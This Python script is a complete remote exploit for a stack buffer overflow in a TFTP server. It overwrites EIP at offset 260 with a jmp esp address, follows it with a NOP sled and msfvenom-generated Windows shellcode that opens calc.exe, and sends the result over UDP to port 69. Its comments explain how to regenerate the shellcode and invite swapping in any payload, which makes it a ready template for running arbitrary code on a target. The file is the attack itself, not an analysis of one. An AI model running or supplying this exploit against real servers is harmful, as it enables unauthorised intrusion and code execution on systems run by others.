import socket
import struct

"""
OKAY, FIRST THINGS FIRST – SET THE TARGET IP AND PORT OF THE TFTP SERVER.
MAKE SURE THIS IP IS WHERE THE TARGET SERVER ACTUALLY IS.
"""
target_ip = "192.168.1.10"
target_port = 69

"""
TIME TO SET UP THE MAIN PIECES OF OUR PAYLOAD.
- `buffer_size`: THE SIZE WE’RE EXPECTING THE BUFFER TO BE.
- `eip_offset`: WHERE WE’LL ACTUALLY OVERWRITE EIP (WE GOT THIS FROM DEBUGGING).
- `jmp_address`: A GOOD `jmp esp` OR SIMILAR INSTRUCTION TO REDIRECT US TO SHELLCODE.
"""
buffer_size = 512           # USUAL BUFFER SIZE FOR THIS VULN
eip_offset = 260            # OFFSET TO HIT EIP, CONFIRMED IN DEBUGGER
jmp_address = struct.pack("<I", 0x625011AF)  # UPDATE THIS TO AN ACTUAL GOOD ADDRESS FOR YOUR ENVIRONMENT

"""
NOP SLED – WE'RE ADDING A BUNCH OF `NO OPERATION` INSTRUCTIONS
TO HELP MAKE SURE WE SMOOTHLY LAND IN THE SHELLCODE.
"""
nop_sled = b"\x90" * 16

"""
THIS SHELLCODE LAUNCHES `calc.exe` ON WINDOWS.
YOU CAN SWAP IT OUT FOR WHATEVER YOU WANT – HERE’S HOW I MADE THIS ONE:
    msfvenom -p windows/exec CMD=calc.exe -f python -b "\x00"
"""
shellcode = (
    b"\xdb\xc0\xd9\x74\x24\xf4\x5b\xb8\x6e\x9d\x98\x80\x33\xc9\xb1"
    b"\x33\x31\x43\x17\x03\x43\x17\x83\x2b\x88\xab\x3d\xc7\x98\xa8"
    b"\xbe\x38\x59\xce\x37\xdd\x68\xde\x4c\x95\xda\xee\x07\xfb\xd6"
    b"\x85\x4a\xef\x6d\xeb\x42\x18\xc5\x46\xb5\x17\xd6\xfb\x05\x36"
    b"\x54\x06\x5a\x98\x65\xc9\xaf\xd9\xa2\x34\x5d\x8b\x7b\x32\xf0"
    b"\x3c\x0f\x0e\xc9\xb7\x43\x9e\x49\x24\x13\xa1\x78\xfb\x28\xf8"
    b"\x5a\xfd\xfd\x70\xd2\xe5\xe2\xbd\xad\x9e\xd1\x4a\x2c\x76\x28"
    b"\xb2\x83\xb7\x85\x41\xdd\xfc\x21\xba\xa8\xf4\x52\x47\xab\xc2"
    b"\x29\x93\x3e\xd1\x8a\x50\x98\x3e\x2a\xb4\x7f\xb4\x20\x71\x0b"
    b"\x92\x24\x84\xd8\xa8\x51\x0f\xdf\x7e\xd0\x4b\xc4\xa3\xb9\x08"
    b"\x65\x65\x64\xfe\x9a\x75\xc7\x5f\x3f\xfd\xea\x34\x32\x5c\x63"
    b"\x64\x70\x24\x93\xf0\x03\x57\xa1\x5f\xb8\xff\x89\x28\x66\xf8"
    b"\xee\x07\xde\x96\x10\x25\x41\x47\x19\x6c\x86\x13\x49\x06\x27"
    b"\x1f\xa5\xdb\xde\xde\x1a\x1c\x0e\x68\x6f"
)

"""
CONSTRUCTING THE FINAL PAYLOAD:
1. FILLER TO GET UP TO THE OVERFLOW POINT.
2. WE’LL OVERWRITE EIP WITH OUR JUMP ADDRESS.
3. ADD THE NOP SLED SO WE LAND SMOOTHLY.
4. DROP IN THE SHELLCODE TO ACTUALLY DO SOMETHING (LIKE OPEN CALC).
"""
payload = (
    b"A" * eip_offset +  # FILLER TO REACH EIP
    jmp_address +        # THE JUMP ADDRESS, CHECKED IN DEBUGGER
    nop_sled +           # THE NOP SLED FOR SAFE LANDING
    shellcode            # OUR SHELLCODE TO LAUNCH `calc.exe`
)

"""
SEND THE PAYLOAD OVER UDP TO THE TFTP SERVER.
"""
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

try:
    sock.sendto(payload, (target_ip, target_port))
    print("[+] EXPLOIT SENT SUCCESSFULLY!")
except Exception as e:
    print(f"[-] ERROR SENDING EXPLOIT: {e}")
finally:
    sock.close()
